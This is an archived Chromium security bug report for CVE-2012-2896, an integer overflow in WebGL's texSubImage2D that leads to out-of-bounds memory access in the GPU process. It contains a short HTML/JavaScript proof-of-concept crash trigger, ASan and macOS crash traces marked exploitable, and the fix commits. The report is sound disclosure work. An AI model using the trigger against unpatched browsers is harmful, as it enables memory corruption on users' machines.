# Security: integer overflow in gpu process with webgl

| Field | Value |
|-------|-------|
| **Issue ID** | [40065931](https://issues.chromium.org/issues/40065931) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>WebGL |
| **CVE IDs** | CVE-2012-2896 |
| **Reporter** | mi...@gmail.com |
| **Assignee** | gm...@chromium.org |
| **Created** | 2012-08-29 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

integer overflow in gpu process with webgl

this might be an asan bug.

chromium and chrome say:  

[ERROR:gles2\_cmd\_decoder.cc(5133)] .WebGLRenderingContext: GL ERROR :GL\_INVALID\_VALUE : glTexSubImage2D: bad dimensions.

**VERSION**  

Chrome Version: dev  

Operating System: linux 64bit

**REPRODUCTION CASE**

<html>
<head>
<script>
var gl = document.createElement("canvas").getContext('experimental-webgl')
var texture = gl.createTexture()
gl.bindTexture(gl.TEXTURE\_2D, texture)
gl.texImage2D(gl.TEXTURE\_2D, 0, gl.RGBA, 256, 256, 0, gl.RGBA, gl.UNSIGNED\_BYTE, null)
gl.texSubImage2D(gl.TEXTURE\_2D, 0, 0, 0x7fffff00, 256, 256, gl.RGBA, gl.UNSIGNED\_BYTE, new Uint8Array(256 \\* 256 \\* 4))
</script>
</head>
</html>

same problem with the large number in the x position.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: asan + gpu  

Crash State:

==2978== ERROR: AddressSanitizer unknown-crash on address 0x8000e033f080 at pc 0x55555f2a4310 bp 0x7fffffff7550 sp 0x7fffffff7308  

READ of size 1 at 0x8000e033f080 thread T0  

#0 0x55555f2a430f in \_\_interceptor\_memcpy ??:0  

#1 0x7fffe95934c6 in ?? ??:0  

==2978== AddressSanitizer CHECK failed: /usr/local/google/chrome/src/third\_party/llvm/projects/compiler-rt/lib/asan/asan\_report.cc:136 "((0 && "Address is not in memory and not in shadow?")) != (0)" (0x0, 0x0)  

#0 0x55555f2a923e in \_\_sanitizer::CheckFailed(char const\*, int, char const\*, unsigned long long, unsigned long long) ??:0  

#1 0x55555f2a83a9 in \_\_asan::DescribeAddressIfShadow(unsigned long) ??:0

## Attachments

- [overflow.html](attachments/overflow.html) (text/html; charset=us-ascii, 443 B)
- [overflow.txt](attachments/overflow.txt) (text/x-c; charset=us-ascii, 1.3 KB)

## Timeline

### ts...@chromium.org (2012-08-30)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-08-30)

@kcc: ASAN bug or real?

### kc...@chromium.org (2012-08-31)

All I see now is a null deref, and asan is unable to unwind through it.. 

### gl...@chromium.org (2012-08-31)

The NULL deref is reproducible for me under Chrome built with just Clang (without ASan): https://crash.corp.google.com/reportdetail?reportid=b482b3a3089c9c91

Here's the crashing thread stack:


0x7f12a3cc6fc1	 [libc-2.11.1.so]	 + 0x00086fc1]	
0x7f129d6a06f5	 [libnvidia-glcore.so.295.71]	 + 0x010266f5]	
0x7f129d6aa7d9	 [libnvidia-glcore.so.295.71]	 + 0x010307d9]	
0x7f129d6a069f	 [libnvidia-glcore.so.295.71]	 + 0x0102669f]	
0x7f129d7afbcd	 [libnvidia-glcore.so.295.71]	 + 0x01135bcd]	
0x7f129d7a4bfa	 [libnvidia-glcore.so.295.71]	 + 0x0112abfa]	
0x7f1299db60f7	 [.com.google.Chrome.7YWdZV (deleted)]	 + 0x000100f7]	
0x7f1299db60f7	 [.com.google.Chrome.7YWdZV (deleted)]	 + 0x000100f7]	
0x7f1299db60f7	 [.com.google.Chrome.7YWdZV (deleted)]	 + 0x000100f7]	

### zm...@chromium.org (2012-08-31)

Ken is on vacation.  I'll take a look.

### sc...@gmail.com (2012-09-06)

[Empty comment from Monorail migration]

### zm...@chromium.org (2012-09-06)

[Empty comment from Monorail migration]

### mi...@gmail.com (2012-09-06)

works on intel

==7710== ERROR: AddressSanitizer crashed on unknown address 0x7fffe31a5000 (pc 0x7fffe9a5afc2 sp 0x7fffffff74a0 bp 0x000000000400 T0)
AddressSanitizer can not provide additional info.
    #0 0x7fffe9a5afc2 (/usr/lib/x86_64-linux-gnu/dri/libdricore.so+0xdffc2)
Stats: 37M malloced (35M for red zones) by 50451 calls

### gm...@chromium.org (2012-09-07)

This was a bug in the overflow math code

There's a CL here that fixes it
http://codereview.chromium.org/10916165/

### bu...@chromium.org (2012-09-07)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=155478

------------------------------------------------------------------------
r155478 | gman@chromium.org | 2012-09-07T20:54:47.815856Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/gpu/command_buffer/service/gles2_cmd_decoder.cc?r1=155478&r2=155477&pathrev=155478
   M http://src.chromium.org/viewvc/chrome/trunk/src/gpu/command_buffer/common/gles2_cmd_utils_unittest.cc?r1=155478&r2=155477&pathrev=155478
   M http://src.chromium.org/viewvc/chrome/trunk/src/gpu/command_buffer/common/gles2_cmd_utils.h?r1=155478&r2=155477&pathrev=155478
   M http://src.chromium.org/viewvc/chrome/trunk/src/gpu/command_buffer/service/texture_manager.cc?r1=155478&r2=155477&pathrev=155478

Fix SafeAdd and SafeMultiply

BUG=145648,145544


Review URL: https://chromiumcodereview.appspot.com/10916165
------------------------------------------------------------------------

### in...@chromium.org (2012-09-07)

miaubiz, can you try on trunk so see if it fixes for you ?

### mi...@gmail.com (2012-09-08)

fixed in 155560 for me

### sc...@gmail.com (2012-09-08)

@miaubiz: thanks. I'll get it merged for the upcoming Chrome 22 release.

We actually tracked this to a legitimate modern compiler optimization on tricky code. I wonder if other release compiles are affected? Win, Linux, ... if so, might be fun to try and read the OOB texture values via JS ;-) Rewards panel now loves that sort of thing.

### mi...@gmail.com (2012-09-10)

@scarybeasts: can you please elaborate on what you mean, by the legitimate modern compiler optimization, and by how to proceed checking more stuff 

### sc...@gmail.com (2012-09-10)

@miaubiz: the problem is "signed arithmetic overflow behaviour" -- which is specifically undefined in the C standard. We had some code relying on it. Modern compilers will perform optimizations that break such code.

So, the clang / ASAN compiler you used to find this bug definitely has the optimization!

But what about Windows / MSVC? Does your test case reproduce on Windows?
How about a standard Linux build? That is compiled with GCC.

I think it'd be interesting, that's all :D

### mi...@gmail.com (2012-09-10)

I see.

/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --gpu-launcher="env CW_CURRENT_CASE=scarybeasts $HOME/crashwrangler/exc_handler" --incognito --disable-breakpad scarybeasts.html


Crashed thread log = 
: CrGpuMain  Dispatch queue: com.apple.main-thread
0   libsystem_c.dylib             	0x951baa37 memmove$VARIANT$sse42 + 218
1   libGLImage.dylib              	0x98933e64 glgCopyRowsWithMemCopy(GLGOperationRec const*, unsigned long, GLDPixelModeRec const*) + 106
2   libGLImage.dylib              	0x98932823 glgProcessPixelsWithProcessor + 991
3   GLEngine                      	0x05f1d1aa gleTextureImagePut + 1167
4   GLEngine                      	0x05dc56fe glTexSubImage2D_Exec + 1882
5   libGL.dylib                   	0x92068546 glTexSubImage2D + 87
6   com.google.Chrome.framework   	0x02679fe8 ChromeMain + 39718232

---
exception=EXC_BAD_ACCESS:signal=11:is_exploitable=yes:instruction_disassembly=movdqa	%xmm0,(%edi,%edx):instruction_address=0x00000000951baa37:access_type=write:access_address=0x0000000007c0f000:

### mi...@gmail.com (2012-09-10)

meanwhile on Safari, requires manually setting 'Enable WebGL' tho.

Thread 0 Crashed:: Dispatch queue: com.apple.main-thread
0   libsystem_c.dylib                   0x00007fff89385aa7 memmove$VARIANT$sse42 + 159
1   libGLImage.dylib                    0x00007fff86dc2acc glgCopyRowsWithMemCopy(GLGOperationRec const*, unsigned long, GLDPixelModeRec const*) + 129
2   libGLImage.dylib                    0x00007fff86dc1644 glgProcessPixelsWithProcessor + 885
3   GLEngine                            0x0000000150e6cf6d gleTextureImagePut + 1264
4   GLEngine                            0x0000000150d1bb7b glTexSubImage2D_Exec + 1720
5   libGL.dylib                         0x00007fff8e05d28a glTexSubImage2D + 77
6   com.apple.WebCore                   0x00007fff8506c583 WebCore::GraphicsContext3D::texSubImage2D(unsigned int, int, int, int, int, int, unsigned int, unsigned int, void const*) + 83
7   com.apple.WebCore                   0x00007fff858d83ea WebCore::WebGLRenderingContext::texSubImage2D(unsigned int, int, int, int, int, int, unsigned int, unsigned int, WTF::ArrayBufferView*, int&) + 426
8   com.apple.WebCore                   0x00007fff850599b2 WebCore::jsWebGLRenderingContextPrototypeFunctionTexSubImage2D(JSC::ExecState*) + 1602



Path:            /System/Library/PrivateFrameworks/WebKit2.framework/WebProcess.app/Contents/MacOS/WebProcess
Version:         8536 (8536.25)
OS Version:      Mac OS X 10.8.1 (12B19)


### sc...@gmail.com (2012-09-10)

Nice. GCC on Mac clearly affected.

### kc...@chromium.org (2012-09-10)

I thought we use Clang on Mac, not gcc

### sc...@gmail.com (2012-09-10)

Oh, possibly my bad. XCode switched to clang?

### kc...@chromium.org (2012-09-11)

>> XCode switched to clang?
Yep. (Long ago, I think)

### mi...@gmail.com (2012-09-11)

yeah. apple ditched gcc a while back.

osx has no gpu sandbox right? 

### sc...@gmail.com (2012-09-11)

I think it does: content/common/sandbox_mac.mm

### sc...@gmail.com (2012-09-17)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-09-18)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=157200

------------------------------------------------------------------------
r157200 | cevans@chromium.org | 2012-09-17T21:15:15.109053Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/gpu/command_buffer/service/gles2_cmd_decoder.cc?r1=157200&r2=157199&pathrev=157200
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/gpu/command_buffer/common/gles2_cmd_utils_unittest.cc?r1=157200&r2=157199&pathrev=157200
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/gpu/command_buffer/common/gles2_cmd_utils.h?r1=157200&r2=157199&pathrev=157200
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/gpu/command_buffer/service/texture_manager.cc?r1=157200&r2=157199&pathrev=157200

Merge 155478 - Fix SafeAdd and SafeMultiply

BUG=145648,145544


Review URL: https://chromiumcodereview.appspot.com/10916165

TBR=gman@chromium.org
Review URL: https://codereview.chromium.org/10928241
------------------------------------------------------------------------

### sc...@gmail.com (2012-09-25)

@miaubiz: nice job for starting fuzzing on your Mac. Seems to be a new source of revenue :D
$1000

### mi...@gmail.com (2012-09-27)

@scarybeasts: it says [Mac only] [$1000] [145544] High CVE-2012-2896: Integer overflow in WebGL. Credit to miaubiz.

this was on linux too (including intel) see c#0 and c#8

### sc...@gmail.com (2012-09-27)

I think you were seeing it on Linux because ASAN builds use the Clang compiler.
Production Linux builds use GCC. GCC has been known to apply the same optimization but I don't see any crash logs against production builds? So hard to say :)

### sc...@gmail.com (2012-10-11)

[Empty comment from Monorail migration]

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/145544?no_tracker_redirect=1

[Multiple monorail components: Blink, Blink>WebGL]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40065931)*
